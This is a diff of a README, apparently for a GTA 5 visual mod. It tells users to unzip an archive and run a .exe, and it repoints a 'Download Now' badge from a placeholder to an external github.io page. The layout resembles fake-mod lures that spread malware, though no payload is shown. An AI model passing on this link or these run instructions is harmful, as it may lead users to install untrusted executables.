@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gta5-ultimate-visual-gameplay-overhaul.github.io/.github/)
 
 ## 📸 Overview
 ![gta5-ultimate-nextgen-graphics](https://github.com/user-attachments/assets/017597d4-910b-4366-949e-f30eedf3f9b5)
